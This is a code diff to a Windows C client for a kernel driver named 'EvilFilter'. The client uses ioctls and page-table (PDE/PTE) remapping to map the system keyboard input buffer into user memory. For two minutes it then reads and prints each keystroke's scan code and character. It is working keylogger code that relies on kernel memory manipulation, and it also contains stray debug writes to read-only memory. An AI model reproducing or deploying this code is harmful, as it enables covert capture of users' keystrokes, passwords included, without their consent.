@@ -40,6 +40,28 @@ int main(int argc, _TCHAR* argv[]) {
 
 	if (INVALID_HANDLE_VALUE == hControlDevice) {
 		printf("Failed to open EvilFilter device\n");
+
+		PBYTE r = (PBYTE)VirtualAlloc(NULL, sizeof(PBYTE), MEM_COMMIT | MEM_RESERVE, PAGE_READONLY); // PAGE_READONLY);
+		*r = 15;
+		printf("R is [0x%lx][0x%d]\n", r, *r);
+		PULONG x = (PULONG)&r[0];
+		printf("X0 is [0x%lx][0x%lu]\n", x, *x);
+		x = (PULONG)&r[1];
+		printf("X1 is [0x%lx][0x%lu]\n", x, *x);
+		x = (PULONG)&r[2];
+		printf("X2 is [0x%lx][0x%lu]\n", x, *x);
+		x = (PULONG)&r[3];
+		printf("X3 is [0x%lx][0x%lu]\n", x, *x);
+		x = (PULONG)&r[4];
+		printf("X4 is [0x%lx][0x%lu]\n", x, *x);
+		x = (PULONG)&r[5];
+		printf("X5 is [0x%lx][0x%lu]\n", x, *x);
+		x = (PULONG)&r[6];
+		printf("X6 is [0x%lx][0x%lu]\n", x, *x);
+		x = (PULONG)&r[10];
+		printf("X10 is [0x%lx][0x%lu]\n", x, *x);
+		*x = 15;
+		printf("X10 is [0x%lx][0x%lu]\n", x, *x);
 	}
 	else {
 
@@ -71,8 +93,16 @@ int main(int argc, _TCHAR* argv[]) {
 			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
 
 
-			keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
+			//keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
+
+
+			//keyboardData = (PKEYBOARD_INPUT_DATA)&rawAddress[kmdfOffset];
+
+
 			keyboardOffset = (ULONG)keyboardData & 0x0fff;
+
+			printf("keyboardData is [0x%lx] offset is [0x%lx].\n", keyboardData, keyboardOffset);
+			/**/
 			PLLIST listNode;
 			listNode = (PLLIST)malloc(sizeof(LLIST));
 			listNode->keyboardBuffer = keyboardData;
@@ -85,6 +115,7 @@ int main(int argc, _TCHAR* argv[]) {
 				listNode->keyboardBuffer = keyboardData;
 				listNode->previous = previousListNode;
 			}
+
 			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
 			while (listNode != NULL) {
 				PLLIST currentListNode = listNode;
@@ -94,12 +125,17 @@ int main(int argc, _TCHAR* argv[]) {
 				}
 				free(currentListNode);
 			}
-
 			PVOID ppde = GetPdeAddress(keyboardData);
 			PVOID ppte = GetPteAddress(keyboardData);
+			/**/
+
+			//PVOID ppde = GetPdeAddress(rawAddress);
+			//PVOID ppte = GetPteAddress(rawAddress);
 			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);
+			//PKEYBOARD_INPUT_DATA rawAddress = (PKEYBOARD_INPUT_DATA)VirtualAlloc(keyboardData, sizeof(KEYBOARD_INPUT_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READONLY);
 
 			dataToTransmit->ClientMemory = keyboardData;
+			//dataToTransmit->ClientMemory = rawAddress;
 			dataToTransmit->PageDirectory = ppde;
 			dataToTransmit->PageTable = ppte;
 			dataToTransmit->instruction = 'E';
@@ -112,17 +148,61 @@ int main(int argc, _TCHAR* argv[]) {
 				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
 			}
 			else {
-				printf("Ioctl to EvilFilter device succeeded - we now have the real keyboard buffer!!!\n");
-				WaitAMinute();
-				WaitAMinute();
-				WaitAMinute();
+				printf("Ioctl to EvilFilter device succeeded \n");
+				//keyboardData = (PKEYBOARD_INPUT_DATA)&rawAddress[kmdfOffset];
+				printf("keyboardData=[0x%lx]\n", keyboardData);
+				printf(" we now have the real keyboard buffer!!!\n");
+				//printf("keyboardData=[0x%lx]\n", *keyboardData);
+				USHORT lastFlag = 0;
+
+
+				SYSTEMTIME systemTime;
+				GetSystemTime(&systemTime);
+				WORD CurrentMinute = systemTime.wMinute;
+				WORD ExitMinute = systemTime.wMinute + 2;
+				while (CurrentMinute != ExitMinute) {
+					/*
+					
+	USHORT UnitId;
+	USHORT MakeCode;
+	USHORT Flags;
+	USHORT Reserved;
+	ULONG ExtraInformation;
+					*/
+					if (lastFlag != keyboardData->Flags ) { // keyboardData->MakeCode != 0
+						printf(" %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]",
+							keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
+							keyboardData->MakeCode,
+							KeyMap[keyboardData->MakeCode],
+							keyboardData->UnitId,
+							keyboardData->Flags,
+							keyboardData->Reserved,
+							keyboardData->ExtraInformation);
+						printf(" raw:");
+						PCHAR p = (PCHAR)keyboardData;
+						for (int i = 0; i < 12; i++) {
+							printf("[0x%x]", p[i]);
+
+						}
+						printf("\n");
+
+
+
+
+						lastFlag = keyboardData->Flags;
+					}
+					GetSystemTime(&systemTime);
+					CurrentMinute = systemTime.wMinute;
+				}
 			}
 		}
 		CloseHandle(hControlDevice);
 		WaitAMinute();
+		printf("almost done\n");
 		WaitAMinute();
 		// Everything dies right here, right as we exit
 	}
+	printf("fin\n");
 	return 0;
 }
 
